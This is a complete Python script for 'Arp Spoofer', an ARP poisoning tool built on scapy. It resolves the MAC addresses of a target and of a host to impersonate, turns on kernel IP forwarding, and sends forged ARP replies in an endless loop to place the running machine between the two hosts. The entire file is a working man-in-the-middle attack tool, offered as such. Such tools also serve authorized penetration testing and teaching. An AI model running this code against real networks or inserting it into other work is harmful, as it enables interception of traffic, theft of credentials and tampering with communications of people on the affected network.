#!/usr/bin/env python3
import argparse
import datetime
import platform
import binascii
import ipaddress
import time
from scapy.all import send, sr, conf
from scapy.layers.l2 import ARP, Ether
from termcolor import colored
import logging

# Disable scapy warning output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

NAME = "Arp Spoofer"
VERSION = "1.0"
DATE = "02/06/2024"
IP_FORWARD = "/proc/sys/net/ipv4/ip_forward"


def parse_arguments():
    """Parse and return arguments from the command line."""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-no_routing",
        required=False,
        action="store_true",
        help="[Optional] Disable automatic kernel routing enabler.",
    )
    parser.add_argument(
        "-i",
        required=True,
        action="store",
        dest="interface",
        help="Interface to use on DHCP attacks.",
    )
    parser.add_argument(
        "-t",
        required=True,
        action="store",
        dest="target_address",
        help="Target Address or Network",
    )
    parser.add_argument(
        "-s",
        required=True,
        action="store",
        dest="spoof_address",
        help="Spoofed Address or Network",
    )
    return parser.parse_args()


def setup(args):
    """Setup the environment based on provided arguments."""
    conf.verb = 0  # Disable default scapy output

    if args.no_routing:
        print("###[ Ignore Kernel Routing Disabled ]###")
    else:
        print("###[ Enable Kernel Routing Enabling ]###")
        print("###[    echo 1 > /proc/sys/net/ipv4/ip_forward ]###")
        enable_packet_forwarding()
    print("")


def print_banner():
    """Print the banner."""
    print(f"###[ {NAME} ]###")
    print(f"###[ Version {VERSION} ]###")
    print(f"###[ Date {DATE} ]###")
    print("###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###")
    print("")


def ip_list(address_or_ip):
    """Return a list of IP addresses from a network address."""
    try:
        network = ipaddress.ip_network(str(address_or_ip), strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError:
        return [address_or_ip]


def enable_packet_forwarding():
    """Enable packet forwarding."""
    try:
        with open(IP_FORWARD, "w", encoding="utf-8") as fd:
            fd.write("1")
    except IOError as e:
        print(f"Error enabling packet forwarding: {e}")


def disable_packet_forwarding():
    """Disable packet forwarding."""
    try:
        with open(IP_FORWARD, "w", encoding="utf-8") as fd:
            fd.write("0")
    except IOError as e:
        print(f"Error disabling packet forwarding: {e}")


def log_timestamp():
    """Return a timestamp."""
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def mac_to_hex(mac):
    """Convert a MAC address to hex."""
    return (
        binascii.unhexlify(mac.replace(":", ""))
        if "3." in platform.python_version()
        else mac.replace(":", "").decode("hex")
    )


def get_mac_from_ip(ip):
    """Return the MAC address from an IP address."""
    resp, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=1)
    for _, r in resp:
        return r[ARP].hwsrc
    return None


def arp_poison(ip_a, mac_a, ip_b, mac_b, local_mac):
    """ARP Poisoning."""
    try:
        while True:
            send(ARP(op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b, hwsrc=local_mac))
            print(
                f"###[ {log_timestamp()} Forged ARP Reply for: {colored(ip_a, 'red')} : {colored(ip_b, 'blue')} is at {colored(local_mac, 'blue')} ]###"
            )
            send(ARP(op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a))
            print(
                f"###[ {log_timestamp()} Forged ARP Reply for: {colored(ip_b, 'red')} : {colored(ip_a, 'blue')} is at {colored(local_mac, 'blue')} ]###\n"
            )
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP poisoning stopped by user.")


def main():
    """Main function."""
    args = parse_arguments()
    print_banner()
    setup(args)
    local_mac = Ether().src
    mac_target = get_mac_from_ip(args.target_address)
    if mac_target is None:
        print(f"### Target (-t {args.target_address}) not found in the network.")
        exit()
    print(
        f"###[ Target IP Addres: {colored(args.target_address, 'blue')} | MAC Address: {colored(mac_target, 'blue')} ]###"
    )
    mac_spoof = get_mac_from_ip(args.spoof_address)
    if mac_spoof is None:
        print(f"### Spoof (-s {args.spoof_address}) not found in the network.")
        exit()
    print(
        f"###[ Spoofed IP Addres: {colored(args.spoof_address, 'blue')} | MAC Address: {colored(mac_spoof, 'blue')} ]###"
    )
    print("")
    if mac_target and mac_spoof:
        try:
            arp_poison(
                args.target_address,
                mac_target,
                args.spoof_address,
                mac_spoof,
                local_mac,
            )
        except KeyboardInterrupt:
            print("Stopping ARP poisoning.")
    if not args.no_routing:
        disable_packet_forwarding()


if __name__ == "__main__":
    main()
